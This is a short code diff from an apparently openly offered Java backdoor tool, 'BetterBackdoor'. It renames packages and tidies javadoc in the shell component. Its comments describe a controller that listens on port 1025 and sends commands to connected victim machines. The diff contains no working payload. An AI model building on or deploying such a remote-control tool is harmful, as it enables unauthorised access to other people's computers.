@@ -1,6 +1,6 @@
-package com.thatcherdev.betterbackdoor.shell;
+package dev.thatcherclough.betterbackdoor.shell;
 
-import com.thatcherdev.betterbackdoor.BetterBackdoor;
+import dev.thatcherclough.betterbackdoor.BetterBackdoor;
 
 import java.io.File;
 import java.io.ObjectInputStream;
@@ -22,7 +22,7 @@ public class Shell {
 	 * Creates server on port 1025 for client to connect to. Runs {@link Connector#start()} to find
 	 * all possible clients and prompts user to select client to connect to if their are multiple clients.
 	 * Once client has connected, starts an infinite loop that gets command {@code command} from
-	 * user and handles it with {@link com.thatcherdev.betterbackdoor.shell.HandleCommand#handle}.
+	 * user and handles it with {@link HandleCommand#handle}.
 	 */
 	public static void start() {
 		System.out.println("Searching for clients...\n");
@@ -92,7 +92,7 @@ class Connector extends Thread {
 
 	/**
 	 * Attempts to accept connections to {@link Connector#serverSocket} and add the produced sockets to
-	 * {@link com.thatcherdev.betterbackdoor.shell.Shell#connectedMachines}.
+	 * {@link Shell#connectedMachines}.
 	 */
 	public void run() {
 		while (true) {
